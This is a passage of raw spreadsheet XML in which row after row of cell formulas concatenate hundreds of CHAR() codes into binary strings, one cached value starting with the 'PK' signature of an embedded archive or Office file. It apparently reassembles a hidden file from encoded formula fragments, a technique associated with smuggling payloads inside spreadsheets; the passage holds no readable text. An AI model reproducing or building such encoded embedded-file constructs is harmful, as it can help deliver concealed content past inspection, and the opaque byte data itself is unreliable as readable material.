HAR(17)&amp;CHAR(220)&amp;CHAR(134)&amp;CHAR(166)&amp;CHAR(93)&amp;CHAR(38)&amp;CHAR(89)&amp;CHAR(53)&amp;CHAR(156)&amp;CHAR(11)&amp;CHAR(157)&amp;CHAR(48)&amp;CHAR(3)&amp;CHAR(49)&amp;CHAR(140)&amp;CHAR(110)&amp;CHAR(23)&amp;CHAR(152)&amp;CHAR(252)&amp;CHAR(105)&amp;CHAR(207)&amp;CHAR(210)&amp;CHAR(190)&amp;CHAR(162)&amp;CHAR(211)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(20)&amp;CHAR(148)&amp;CHAR(225)&amp;CHAR(222)&amp;CHAR(87)&amp;CHAR(174)&amp;CHAR(98)&amp;CHAR(255)&amp;CHAR(84)&amp;CHAR(246)&amp;CHAR(65)&amp;CHAR(239)&amp;CHAR(132)&amp;CHAR(209)&amp;CHAR(158)&amp;CHAR(87)&amp;CHAR(135)&amp;CHAR(58)&amp;CHAR(97)&amp;CHAR(77)&amp;CHAR(246)&amp;CHAR(34)&amp;CHAR(173)&amp;CHAR(43)&amp;CHAR(59)&amp;CHAR(84)&amp;CHAR(158)&amp;CHAR(246)&amp;CHAR(105)&amp;CHAR(158)&amp;CHAR(1)&amp;CHAR(164)&amp;CHAR(184)&amp;CHAR(116)&amp;CHAR(57)&amp;CHAR(162)&amp;CHAR(28)&amp;CHAR(163)&amp;CHAR(196)&amp;CHAR(140)&amp;CHAR(255)&amp;CHAR(115)&amp;CHAR(205)&amp;CHAR(220)&amp;CHAR(117)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(58)&amp;CHAR(28)&amp;CHAR(179)&amp;CHAR(249)&amp;CHAR(169)&amp;CHAR(169)&amp;CHAR(45)&amp;CHAR(180)&amp;CHAR(21)&amp;CHAR(242)&amp;CHAR(78)&amp;CHAR(53)&amp;CHAR(234)&amp;CHAR(43)&amp;CHAR(243)&amp;CHAR(236)&amp;CHAR(112)&amp;CHAR(158)&amp;CHAR(156)&amp;CHAR(91)&amp;CHAR(210)&amp;CHAR(220)&amp;CHAR(4)&amp;CHAR(201)&amp;CHAR(94)&amp;CHAR(25)&amp;CHAR(50)&amp;CHAR(140)&amp;CHAR(119)&amp;CHAR(84)&amp;CHAR(97)&amp;CHAR(85)&amp;CHAR(255)&amp;CHAR(237)&amp;CHAR(215)&amp;CHAR(68)&amp;CHAR(218)&amp;CHAR(192)&amp;CHAR(205)&amp;CHAR(171)&amp;CHAR(145)&amp;CHAR(30)&amp;CHAR(178)&amp;CHAR(245)&amp;CHAR(77)&amp;CHAR(228)&amp;CHAR(175)&amp;CHAR(179)&amp;CHAR(227)&amp;CHAR(136)&amp;CHAR(85)&amp;CHAR(123)&amp;CHAR(87)&amp;CHAR(121)&amp;CHAR(8)&amp;CHAR(7)&amp;CHAR(49)&amp;CHAR(76)&amp;CHAR(222)&amp;CHAR(186)&amp;CHAR(204)&amp;CHAR(213)&amp;CHAR(47)&amp;CHAR(31)&amp;CHAR(47)&amp;CHAR(49)&amp;CHAR(177)&amp;CHAR(179)&amp;CHAR(245)&amp;CHAR(123)&amp;CHAR(102)&amp;CHAR(159)&amp;CHAR(3)&amp;CHAR(9)&amp;CHAR(54)&amp;CHAR(82)&amp;CHAR(5)&amp;CHAR(210)&amp;CHAR(112)&amp;CHAR(158)&amp;CHAR(137)&amp;CHAR(50)&amp;CHAR(168)&amp;CHAR(127)&amp;CHAR(50)&amp;CHAR(226)&amp;CHAR(239)&amp;CHAR(1)&amp;CHAR(147)&amp;CHAR(8)</f>
        <v>¼PK¹§µzLTÌxK_x000F_®žÛâwüUNbC•:M=b€%x_x0007_eY&gt;u¡ZžI å_x0001_=òô¯`H\'ÊæÜøúY…G_x000D_¢™"rµüzòÅÑ¿qÒ·_x000D_s×‚ã@„l¢¾DÊdxQ_x0011_Ü†¦]&amp;Y5œ_x000B_0_x0003_1Œn_x0017_˜üiÏÒ¾¢Ó_x000B_
_x0014_”áÞW®bÿTöAï„ÑžW‡:aMö"­+;Tžöiž_x0001_¤¸t9¢_x001C_£ÄŒÿsÍÜu‹J:_x001C_³ù©©-´_x0015_òN5ê+óìpžœ[ÒÜ_x0004_É^_x0019_2ŒwTaUÿí×DÚÀÍ«‘_x001E_²õMä¯³ãˆU{Wy_x0008__x0007_1LÞºÌÕ/_x001F_/1±³õ{fŸ_x0003_	6R_x0005_Òpž‰2¨2âï_x0001_“_x0008_</v>
      </c>
      <c r="C68" t="str">
        <f>CHAR(193)&amp;CHAR(206)&amp;CHAR(147)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(188)&amp;CHAR(181)&amp;CHAR(12)&amp;CHAR(131)</f>
        <v>ÁÎ“ë÷ý¼µ_x000C_ƒ</v>
      </c>
    </row>
    <row r="69" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B69" t="str">
        <f>CHAR(195)&amp;CHAR(162)&amp;CHAR(187)&amp;CHAR(50)&amp;CHAR(17)&amp;CHAR(65)&amp;CHAR(48)&amp;CHAR(105)&amp;CHAR(170)&amp;CHAR(106)&amp;CHAR(137)&amp;CHAR(6)&amp;CHAR(18)&amp;CHAR(115)&amp;CHAR(96)&amp;CHAR(228)&amp;CHAR(251)&amp;CHAR(113)&amp;CHAR(205)&amp;CHAR(110)&amp;CHAR(25)&amp;CHAR(59)&amp;CHAR(54)&amp;CHAR(144)&amp;CHAR(103)&amp;CHAR(31)&amp;CHAR(163)&amp;CHAR(95)&amp;CHAR(110)&amp;CHAR(71)&amp;CHAR(233)&amp;CHAR(103)&amp;CHAR(113)&amp;CHAR(45)&amp;CHAR(96)&amp;CHAR(96)&amp;CHAR(225)&amp;CHAR(111)&amp;CHAR(76)&amp;CHAR(234)&amp;CHAR(249)&amp;CHAR(177)&amp;CHAR(55)&amp;CHAR(180)&amp;CHAR(135)&amp;CHAR(35)&amp;CHAR(201)&amp;CHAR(120)&amp;CHAR(119)&amp;CHAR(251)&amp;CHAR(127)&amp;CHAR(3)&amp;CHAR(253)&amp;CHAR(201)&amp;CHAR(255)&amp;CHAR(178)&amp;CHAR(23)&amp;CHAR(22)&amp;CHAR(103)&amp;CHAR(3)&amp;CHAR(155)&amp;CHAR(55)&amp;CHAR(150)&amp;CHAR(77)&amp;CHAR(216)&amp;CHAR(106)&amp;CHAR(62)&amp;CHAR(23)&amp;CHAR(226)&amp;CHAR(70)&amp;CHAR(168)&amp;CHAR(236)&amp;CHAR(177)&amp;CHAR(174)&amp;CHAR(171)&amp;CHAR(31)&amp;CHAR(110)&amp;CHAR(253)&amp;CHAR(138)&amp;CHAR(222)&amp;CHAR(78)&amp;CHAR(94)&amp;CHAR(11)&amp;CHAR(135)&amp;CHAR(49)&amp;CHAR(54)&amp;CHAR(250)&amp;CHAR(31)&amp;CHAR(73)&amp;CHAR(162)&amp;CHAR(247)&amp;CHAR(91)&amp;CHAR(202)&amp;CHAR(110)&amp;CHAR(7)&amp;CHAR(235)&amp;CHAR(177)&amp;CHAR(163)&amp;CHAR(169)&amp;CHAR(144)&amp;CHAR(217)&amp;CHAR(167)&amp;CHAR(192)&amp;CHAR(244)&amp;CHAR(114)&amp;CHAR(3)&amp;CHAR(57)&amp;CHAR(226)&amp;CHAR(100)&amp;CHAR(100)&amp;CHAR(12)&amp;CHAR(252)&amp;CHAR(198)&amp;CHAR(16)&amp;CHAR(113)&amp;CHAR(210)&amp;CHAR(89)&amp;CHAR(202)&amp;CHAR(241)&amp;CHAR(81)&amp;CHAR(42)&amp;CHAR(22)&amp;CHAR(99)&amp;CHAR(221)&amp;CHAR(210)&amp;CHAR(114)&amp;CHAR(97)&amp;CHAR(199)&amp;CHAR(239)&amp;CHAR(218)&amp;CHAR(167)&amp;CHAR(184)&amp;CHAR(8)&amp;CHAR(23)&amp;CHAR(112)&amp;CHAR(2)&amp;CHAR(123)&amp;CHAR(126)&amp;CHAR(10)&amp;CHAR(229)&amp;CHAR(154)&amp;CHAR(182)&amp;CHAR(83)&amp;CHAR(68)&amp;CHAR(108)&amp;CHAR(213)&amp;CHAR(214)&amp;CHAR(215)&amp;CHAR(190)&amp;CHAR(226)&amp;CHAR(54)&amp;CHAR(25)&amp;CHAR(194)&amp;CHAR(189)&amp;CHAR(231)&amp;CHAR(138)&amp;CHAR(108)&amp;CHAR(64)&amp;CHAR(203)&amp;CHAR(87)&amp;CHAR(5)&amp;CHAR(243)&amp;CHAR(183)&amp;CHAR(72)&amp;CHAR(176)&amp;CHAR(178)&amp;CHAR(61)&amp;CHAR(3)&amp;CHAR(252)&amp;CHAR(196)&amp;CHAR(170)&amp;CHAR(7)&amp;CHAR(96)&amp;CHAR(91)&amp;CHAR(214)&amp;CHAR(192)&amp;CHAR(210)&amp;CHAR(20)&amp;CHAR(200)&amp;CHAR(93)&amp;CHAR(98)&amp;CHAR(3)&amp;CHAR(44)&amp;CHAR(170)&amp;CHAR(115)&amp;CHAR(92)&amp;CHAR(176)&amp;CHAR(181)&amp;CHAR(199)&amp;CHAR(210)&amp;CHAR(192)&amp;CHAR(228)&amp;CHAR(111)&amp;CHAR(157)&amp;CHAR(250)&amp;CHAR(47)&amp;CHAR(63)&amp;CHAR(209)&amp;CHAR(156)&amp;CHAR(35)&amp;CHAR(36)&amp;CHAR(196)&amp;CHAR(45)&amp;CHAR(114)&amp;CHAR(63)&amp;CHAR(131)&amp;CHAR(47)&amp;CHAR(147)&amp;CHAR(173)&amp;CHAR(52)&amp;CHAR(96)&amp;CHAR(214)&amp;CHAR(199)&amp;CHAR(10)&amp;CHAR(42)&amp;CHAR(50)&amp;CHAR(13)&amp;CHAR(51)&amp;CHAR(41)&amp;CHAR(160)&amp;CHAR(120)&amp;CHAR(23)&amp;CHAR(165)&amp;CHAR(71)&amp;CHAR(255)&amp;CHAR(151)&amp;CHAR(147)&amp;CHAR(32)&amp;CHAR(222)&amp;CHAR(83)&amp;CHAR(217)&amp;CHAR(116)&amp;CHAR(173)&amp;CHAR(133)&amp;CHAR(74)&amp;CHAR(225)&amp;CHAR(102)&amp;CHAR(7)&amp;CHAR(193)&amp;CHAR(16)&amp;CHAR(110)&amp;CHAR(193)&amp;CHAR(123)&amp;CHAR(36)&amp;CHAR(162)&amp;CHAR(43)&amp;CHAR(88)&amp;CHAR(94)&amp;CHAR(29)&amp;CHAR(52)&amp;CHAR(217)&amp;CHAR(33)&amp;CHAR(6)&amp;CHAR(96)&amp;CHAR(138)</f>
        <v>Ã¢»2_x0011_A0iªj‰_x0006__x0012_s`äûqÍn_x0019_;6g_x001F_£_nGégq-``áoLêù±7´‡#Éxwû_x0003_ýÉÿ²_x0017__x0016_g_x0003_›7–MØj&gt;_x0017_âF¨ì±®«_x001F_nýŠÞN^_x000B_‡16ú_x001F_I¢÷[Ên_x0007_ë±£©Ù§Àôr_x0003_9âdd_x000C_üÆ_x0010_qÒYÊñQ*_x0016_cÝÒraÇïÚ§¸_x0008__x0017_p_x0002_{~
åš¶SDlÕÖ×¾â6_x0019_Â½çŠl@ËW_x0005_ó·H°²=_x0003_üÄª_x0007_`[ÖÀÒ_x0014_È]b_x0003_,ªs\°µÇÒÀäoú/?Ñœ#$Ä-r?ƒ/“­4`ÖÇ
*2_x000D_3) x_x0017_¥Gÿ—“ ÞSÙt­…Jáf_x0007_Á_x0010_nÁ{$¢+X^_x001D_4Ù!_x0006_`Š</v>
      </c>
      <c r="C69" t="str">
        <f>CHAR(243)&amp;CHAR(96)&amp;CHAR(254)&amp;CHAR(2)&amp;CHAR(164)&amp;CHAR(94)&amp;CHAR(72)&amp;CHAR(43)&amp;CHAR(180)&amp;CHAR(110)</f>
        <v>ó`þ_x0002_¤^H+´n</v>
      </c>
    </row>
    <row r="70" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B70" t="str">
        <f>CHAR(229)&amp;CHAR(164)&amp;CHAR(191)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(197)&amp;CHAR(3)&amp;CHAR(171)&amp;CHAR(127)&amp;CHAR(21)&amp;CHAR(239)&amp;CHAR(103)&amp;CHAR(192)&amp;CHAR(33)&amp;CHAR(166)&amp;CHAR(76)&amp;CHAR(101)&amp;CHAR(8)&amp;CHAR(165)&amp;CHAR(241)&amp;CHAR(80)&amp;CHAR(49)&amp;CHAR(40)&amp;CHAR(204)&amp;CHAR(50)&amp;CHAR(92)&amp;CHAR(135)&amp;CHAR(44)&amp;CHAR(143)&amp;CHAR(168)&amp;CHAR(213)&amp;CHAR(155)&amp;CHAR(70)&amp;CHAR(183)&amp;CHAR(10)&amp;CHAR(89)&amp;CHAR(45)&amp;CHAR(67)&amp;CHAR(67)&amp;CHAR(203)&amp;CHAR(45)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(199)&amp;CHAR(15)&amp;CHAR(238)&amp;CHAR(135)&amp;CHAR(101)&amp;CHAR(120)&amp;CHAR(64)&amp;CHAR(19)&amp;CHAR(61)&amp;CHAR(47)&amp;CHAR(151)&amp;CHAR(16)&amp;CHAR(44)&amp;CHAR(38)&amp;CHAR(34)&amp;CHAR(244)&amp;CHAR(239)&amp;CHAR(233)&amp;CHAR(254)&amp;CHAR(187)&amp;CHAR(161)&amp;CHAR(222)&amp;CHAR(112)&amp;CHAR(129)&amp;CHAR(80)&amp;CHAR(218)&amp;CHAR(91)&amp;CHAR(69)&amp;CHAR(105)&amp;CHAR(98)&amp;CHAR(83)&amp;CHAR(217)&amp;CHAR(226)&amp;CHAR(185)&amp;CHAR(160)&amp;CHAR(106)&amp;CHAR(81)&amp;CHAR(169)&amp;CHAR(129)&amp;CHAR(106)&amp;CHAR(218)&amp;CHAR(77)&amp;CHAR(184)&amp;CHAR(245)&amp;CHAR(243)&amp;CHAR(236)&amp;CHAR(203)&amp;CHAR(196)&amp;CHAR(39)&amp;CHAR(180)&amp;CHAR(145)&amp;CHAR(34)&amp;CHAR(221)&amp;CHAR(177)&amp;CHAR(130)&amp;CHAR(207)&amp;CHAR(69)&amp;CHAR(190)&amp;CHAR(152)&amp;CHAR(220)&amp;CHAR(88)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(5)&amp;CHAR(252)&amp;CHAR(153)&amp;CHAR(190)&amp;CHAR(175)&amp;CHAR(18)&amp;CHAR(185)&amp;CHAR(233)&amp;CHAR(164)&amp;CHAR(200)&amp;CHAR(153)&amp;CHAR(39)&amp;CHAR(120)&amp;CHAR(3)&amp;CHAR(137)&amp;CHAR(24)&amp;CHAR(35)&amp;CHAR(253)&amp;CHAR(227)&amp;CHAR(59)&amp;CHAR(184)&amp;CHAR(176)&amp;CHAR(156)&amp;CHAR(71)&amp;CHAR(68)&amp;CHAR(153)&amp;CHAR(85)&amp;CHAR(178)&amp;CHAR(160)&amp;CHAR(79)&amp;CHAR(66)&amp;CHAR(37)&amp;CHAR(120)&amp;CHAR(155)&amp;CHAR(64)&amp;CHAR(135)&amp;CHAR(195)&amp;CHAR(40)&amp;CHAR(168)&amp;CHAR(117)&amp;CHAR(135)&amp;CHAR(253)&amp;CHAR(157)&amp;CHAR(217)&amp;CHAR(140)&amp;CHAR(102)&amp;CHAR(81)&amp;CHAR(58)&amp;CHAR(62)&amp;CHAR(230)&amp;CHAR(227)&amp;CHAR(29)&amp;CHAR(10)&amp;CHAR(220)&amp;CHAR(229)&amp;CHAR(122)&amp;CHAR(223)&amp;CHAR(69)&amp;CHAR(20)&amp;CHAR(130)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(58)&amp;CHAR(17)&amp;CHAR(26)&amp;CHAR(113)&amp;CHAR(73)&amp;CHAR(185)&amp;CHAR(5)&amp;CHAR(50)&amp;CHAR(228)&amp;CHAR(90)&amp;CHAR(117)&amp;CHAR(170)&amp;CHAR(16)&amp;CHAR(167)&amp;CHAR(163)&amp;CHAR(152)&amp;CHAR(246)&amp;CHAR(141)&amp;CHAR(253)&amp;CHAR(94)&amp;CHAR(230)&amp;CHAR(53)&amp;CHAR(199)&amp;CHAR(14)&amp;CHAR(28)&amp;CHAR(51)&amp;CHAR(1)&amp;CHAR(14)&amp;CHAR(23)&amp;CHAR(22)&amp;CHAR(217)&amp;CHAR(206)&amp;CHAR(226)&amp;CHAR(161)&amp;CHAR(94)&amp;CHAR(15)&amp;CHAR(114)&amp;CHAR(128)&amp;CHAR(79)&amp;CHAR(62)&amp;CHAR(172)&amp;CHAR(224)&amp;CHAR(53)&amp;CHAR(185)&amp;CHAR(124)&amp;CHAR(77)&amp;CHAR(193)&amp;CHAR(57)&amp;CHAR(178)&amp;CHAR(243)&amp;CHAR(18)&amp;CHAR(37)&amp;CHAR(19)&amp;CHAR(36)&amp;CHAR(108)&amp;CHAR(150)&amp;CHAR(182)&amp;CHAR(102)&amp;CHAR(240)&amp;CHAR(77)&amp;CHAR(115)&amp;CHAR(8)&amp;CHAR(201)&amp;CHAR(158)&amp;CHAR(73)&amp;CHAR(127)&amp;CHAR(21)&amp;CHAR(60)&amp;CHAR(4)&amp;CHAR(205)&amp;CHAR(4)&amp;CHAR(86)&amp;CHAR(23)&amp;CHAR(184)&amp;CHAR(44)&amp;CHAR(215)&amp;CHAR(26)&amp;CHAR(204)&amp;CHAR(207)&amp;CHAR(181)&amp;CHAR(104)&amp;CHAR(23)&amp;CHAR(149)&amp;CHAR(217)&amp;CHAR(93)&amp;CHAR(195)&amp;CHAR(153)</f>
        <v>å¤¿_x0001_ýÅ_x0003_«_x0015_ïgÀ!¦Le_x0008_¥ñP1(Ì2\‡,¨Õ›F·
Y-CCË-
Ç_x000F_î‡ex@_x0013_=/—_x0010_,&amp;"ôïéþ»¡ÞpPÚ[EibSÙâ¹ jQ©jÚM¸õóìËÄ'´‘"Ý±‚ÏE¾˜ÜX_x0008_
_x0005_ü™¾¯_x0012_¹é¤È™'x_x0003_‰_x0018_#ýã;¸°œGD™U² OB%x›@‡Ã(¨u‡ýÙŒfQ:&gt;æã_x001D_
ÜåzßE_x0014_‚_x0005__x0007_:_x0011__x001A_qI¹_x0005_2äZuª_x0010_§£˜öý^æ5Ç_x000E__x001C_3_x0001__x000E__x0017__x0016_ÙÎâ¡^_x000F_r€O&gt;¬à5¹|MÁ9²ó_x0012_%_x0013_$l–¶fðMs_x0008_ÉžI_x0015_&lt;_x0004_Í_x0004_V_x0017_¸,×_x001A_ÌÏµh_x0017_•Ù]Ã™</v>
      </c>
      <c r="C70" t="str">
        <f>CHAR(124)&amp;CHAR(255)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(239)&amp;CHAR(210)&amp;CHAR(213)</f>
        <v>|ÿô6¨£0ïÒÕ</v>
      </c>
    </row>
    <row r="71" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B71" t="str">
        <f>CHAR(133)&amp;CHAR(43)&amp;CHAR(203)&amp;CHAR(175)&amp;CHAR(49)&amp;CHAR(62)&amp;CHAR(58)&amp;CHAR(224)&amp;CHAR(17)&amp;CHAR(167)&amp;CHAR(104)&amp;CHAR(195)&amp;CHAR(136)&amp;CHAR(249)&amp;CHAR(238)&amp;CHAR(76)&amp;CHAR(15)&amp;CHAR(209)&amp;CHAR(144)&amp;CHAR(221)&amp;CHAR(223)&amp;CHAR(117)&amp;CHAR(185)&amp;CHAR(221)&amp;CHAR(46)&amp;CHAR(89)&amp;CHAR(2)&amp;CHAR(240)&amp;CHAR(184)&amp;CHAR(161)&amp;CHAR(100)&amp;CHAR(63)&amp;CHAR(204)&amp;CHAR(165)&amp;CHAR(138)&amp;CHAR(127)&amp;CHAR(183)&amp;CHAR(93)&amp;CHAR(160)&amp;CHAR(71)&amp;CHAR(232)&amp;CHAR(1)&amp;CHAR(45)&amp;CHAR(222)&amp;CHAR(140)&amp;CHAR(99)&amp;CHAR(243)&amp;CHAR(215)&amp;CHAR(233)&amp;CHAR(160)&amp;CHAR(26)&amp;CHAR(30)&amp;CHAR(92)&amp;CHAR(234)&amp;CHAR(202)&amp;CHAR(209)&amp;CHAR(214)&amp;CHAR(188)&amp;CHAR(63)&amp;CHAR(170)&amp;CHAR(91)&amp;CHAR(25)&amp;CHAR(229)&amp;CHAR(46)&amp;CHAR(231)&amp;CHAR(186)&amp;CHAR(41)&amp;CHAR(7)&amp;CHAR(181)&amp;CHAR(255)&amp;CHAR(60)&amp;CHAR(156)&amp;CHAR(58)&amp;CHAR(83)&amp;CHAR(16)&amp;CHAR(143)&amp;CHAR(144)&amp;CHAR(129)&amp;CHAR(32)&amp;CHAR(213)&amp;CHAR(155)&amp;CHAR(110)&amp;CHAR(93)&amp;CHAR(244)&amp;CHAR(219)&amp;CHAR(37)&amp;CHAR(217)&amp;CHAR(33)&amp;CHAR(223)&amp;CHAR(197)&amp;CHAR(182)&amp;CHAR(119)&amp;CHAR(193)&amp;CHAR(71)&amp;CHAR(182)&amp;CHAR(190)&amp;CHAR(40)&amp;CHAR(179)&amp;CHAR(217)&amp;CHAR(70)&amp;CHAR(60)&amp;CHAR(161)&amp;CHAR(112)&amp;CHAR(157)&amp;CHAR(96)&amp;CHAR(199)&amp;CHAR(113)&amp;CHAR(176)&amp;CHAR(168)&amp;CHAR(253)&amp;CHAR(117)&amp;CHAR(209)&amp;CHAR(194)&amp;CHAR(68)&amp;CHAR(125)&amp;CHAR(108)&amp;CHAR(147)&amp;CHAR(187)&amp;CHAR(173)&amp;CHAR(232)&amp;CHAR(122)&amp;CHAR(53)&amp;CHAR(128)&amp;CHAR(227)&amp;CHAR(68)&amp;CHAR(36)&amp;CHAR(198)&amp;CHAR(112)&amp;CHAR(127)&amp;CHAR(49)&amp;CHAR(12)&amp;CHAR(223)&amp;CHAR(235)&amp;CHAR(249)&amp;CHAR(14)&amp;CHAR(94)&amp;CHAR(165)&amp;CHAR(144)&amp;CHAR(223)&amp;CHAR(61)&amp;CHAR(54)&amp;CHAR(75)&amp;CHAR(198)&amp;CHAR(58)&amp;CHAR(131)&amp;CHAR(134)&amp;CHAR(155)&amp;CHAR(129)&amp;CHAR(216)&amp;CHAR(37)&amp;CHAR(49)&amp;CHAR(198)&amp;CHAR(217)&amp;CHAR(208)&amp;CHAR(143)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(146)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(162)&amp;CHAR(196)&amp;CHAR(100)&amp;CHAR(136)&amp;CHAR(108)&amp;CHAR(160)&amp;CHAR(93)&amp;CHAR(26)&amp;CHAR(33)&amp;CHAR(255)&amp;CHAR(151)&amp;CHAR(184)&amp;CHAR(3)&amp;CHAR(56)&amp;CHAR(96)&amp;CHAR(96)&amp;CHAR(43)&amp;CHAR(139)&amp;CHAR(246)&amp;CHAR(250)&amp;CHAR(237)&amp;CHAR(79)&amp;CHAR(3)&amp;CHAR(42)&amp;CHAR(202)&amp;CHAR(78)&amp;CHAR(21)&amp;CHAR(134)&amp;CHAR(188)&amp;CHAR(70)&amp;CHAR(68)&amp;CHAR(138)&amp;CHAR(145)&amp;CHAR(217)&amp;CHAR(167)&amp;CHAR(149)&amp;CHAR(4)&amp;CHAR(111)&amp;CHAR(163)&amp;CHAR(69)&amp;CHAR(85)&amp;CHAR(222)&amp;CHAR(206)&amp;CHAR(18)&amp;CHAR(157)&amp;CHAR(92)&amp;CHAR(141)&amp;CHAR(20)&amp;CHAR(199)&amp;CHAR(210)&amp;CHAR(73)&amp;CHAR(153)&amp;CHAR(83)&amp;CHAR(15)&amp;CHAR(248)&amp;CHAR(226)&amp;CHAR(226)&amp;CHAR(45)&amp;CHAR(116)&amp;CHAR(114)&amp;CHAR(32)&amp;CHAR(131)&amp;CHAR(233)&amp;CHAR(110)&amp;CHAR(73)&amp;CHAR(109)&amp;CHAR(210)&amp;CHAR(239)&amp;CHAR(26)&amp;CHAR(83)&amp;CHAR(243)&amp;CHAR(110)&amp;CHAR(111)&amp;CHAR(242)&amp;CHAR(98)&amp;CHAR(212)&amp;CHAR(103)&amp;CHAR(153)&amp;CHAR(197)&amp;CHAR(88)&amp;CHAR(66)&amp;CHAR(143)&amp;CHAR(224)&amp;CHAR(233)&amp;CHAR(2)&amp;CHAR(28)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(143)&amp;CHAR(232)&amp;CHAR(79)&amp;CHAR(41)&amp;CHAR(79)&amp;CHAR(160)&amp;CHAR(192)</f>
        <v>…+Ë¯1&gt;:à_x0011_§hÃˆùîL_x000F_ÑÝßu¹Ý.Y_x0002_ð¸¡d?Ì¥Š·] Gè_x0001_-ÞŒcó×é _x001A__x001E_\êÊÑÖ¼?ª[_x0019_å.çº)_x0007_µÿ&lt;œ:S_x0010_ Õ›n]ôÛ%Ù!ßÅ¶wÁG¶¾(³ÙF&lt;¡p`Çq°¨ýuÑÂD}l“»­èz5€ãD$Æp1_x000C_ßëù_x000E_^¥ß=6KÆ:ƒ†›Ø%1ÆÙÐ
_x0002_’A'¢Ädˆl ]_x001A_!ÿ—¸_x0003_8``+‹öúíO_x0003_*ÊN_x0015_†¼FDŠ‘Ù§•_x0004_o£EUÞÎ_x0012_\_x0014_ÇÒI™S_x000F_øââ-tr ƒénImÒï_x001A_SónoòbÔg™ÅXBàé_x0002__x001C__x0003_êèO)O À</v>
      </c>
      <c r="C71" t="str">
        <f>CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)&amp;CHAR(56)&amp;CHAR(43)&amp;CHAR(135)&amp;CHAR(181)&amp;CHAR(127)&amp;CHAR(54)</f>
        <v>ô6Í£8+‡µ6</v>
      </c>
    </row>
    <row r="72" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B72" t="str">
        <f>CHAR(12)&amp;CHAR(64)&amp;CHAR(8)&amp;CHAR(213)&amp;CHAR(10)&amp;CHAR(178)&amp;CHAR(211)&amp;CHAR(11)&amp;CHAR(228)&amp;CHAR(12)&amp;CHAR(69)&amp;CHAR(21)&amp;CHAR(111)&amp;CHAR(239)&amp;CHAR(153)&amp;CHAR(81)&amp;CHAR(212)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(48)&amp;CHAR(234)&amp;CHAR(138)&amp;CHAR(6)&amp;CHAR(218)&amp;CHAR(126)&amp;CHAR(239)&amp;CHAR(157)&amp;CHAR(56)&amp;CHAR(123)&amp;CHAR(93)&amp;CHAR(197)&amp;CHAR(33)&amp;CHAR(11)&amp;CHAR(218)&amp;CHAR(110)&amp;CHAR(219)&amp;CHAR(241)&amp;CHAR(225)&amp;CHAR(142)&amp;CHAR(216)&amp;CHAR(91)&amp;CHAR(173)&amp;CHAR(202)&amp;CHAR(47)&amp;CHAR(107)&amp;CHAR(37)&amp;CHAR(244)&amp;CHAR(47)&amp;CHAR(128)&amp;CHAR(17)&amp;CHAR(204)&amp;CHAR(140)&amp;CHAR(144)&amp;CHAR(253)&amp;CHAR(215)&amp;CHAR(152)&amp;CHAR(164)&amp;CHAR(229)&amp;CHAR(43)&amp;CHAR(192)&amp;CHAR(248)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(196)&amp;CHAR(99)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(177)&amp;CHAR(197)&amp;CHAR(201)&amp;CHAR(150)&amp;CHAR(192)&amp;CHAR(87)&amp;CHAR(217)&amp;CHAR(51)&amp;CHAR(104)&amp;CHAR(131)&amp;CHAR(219)&amp;CHAR(82)&amp;CHAR(16)&amp;CHAR(54)&amp;CHAR(137)&amp;CHAR(212)&amp;CHAR(124)&amp;CHAR(97)&amp;CHAR(101)&amp;CHAR(195)&amp;CHAR(157)&amp;CHAR(82)&amp;CHAR(228)&amp;CHAR(161)&amp;CHAR(126)&amp;CHAR(130)&amp;CHAR(234)&amp;CHAR(246)&amp;CHAR(27)&amp;CHAR(73)&amp;CHAR(166)&amp;CHAR(163)&amp;CHAR(17)&amp;CHAR(157)&amp;CHAR(156)&amp;CHAR(110)&amp;CHAR(75)&amp;CHAR(194)&amp;CHAR(58)&amp;CHAR(243)&amp;CHAR(165)&amp;CHAR(162)&amp;CHAR(73)&amp;CHAR(71)&amp;CHAR(6)&amp;CHAR(16)&amp;CHAR(101)&amp;CHAR(250)&amp;CHAR(207)&amp;CHAR(25)&amp;CHAR(176)&amp;CHAR(154)&amp;CHAR(49)&amp;CHAR(222)&amp;CHAR(124)&amp;CHAR(24)&amp;CHAR(98)&amp;CHAR(30)&amp;CHAR(168)&amp;CHAR(30)&amp;CHAR(254)&amp;CHAR(207)&amp;CHAR(119)&amp;CHAR(86)&amp;CHAR(91)&amp;CHAR(2)&amp;CHAR(109)&amp;CHAR(146)&amp;CHAR(237)&amp;CHAR(137)&amp;CHAR(22)&amp;CHAR(82)&amp;CHAR(53)&amp;CHAR(153)&amp;CHAR(87)&amp;CHAR(35)&amp;CHAR(79)&amp;CHAR(59)&amp;CHAR(138)&amp;CHAR(4)&amp;CHAR(111)&amp;CHAR(12)&amp;CHAR(137)&amp;CHAR(212)&amp;CHAR(27)&amp;CHAR(252)&amp;CHAR(82)&amp;CHAR(196)&amp;CHAR(235)&amp;CHAR(186)&amp;CHAR(145)&amp;CHAR(224)&amp;CHAR(193)&amp;CHAR(179)&amp;CHAR(55)&amp;CHAR(66)&amp;CHAR(92)&amp;CHAR(207)&amp;CHAR(115)&amp;CHAR(227)&amp;CHAR(241)&amp;CHAR(96)&amp;CHAR(180)&amp;CHAR(54)&amp;CHAR(41)&amp;CHAR(166)&amp;CHAR(227)&amp;CHAR(62)&amp;CHAR(238)&amp;CHAR(52)&amp;CHAR(135)&amp;CHAR(206)&amp;CHAR(14)&amp;CHAR(226)&amp;CHAR(158)&amp;CHAR(63)&amp;CHAR(193)&amp;CHAR(80)&amp;CHAR(251)&amp;CHAR(102)&amp;CHAR(236)&amp;CHA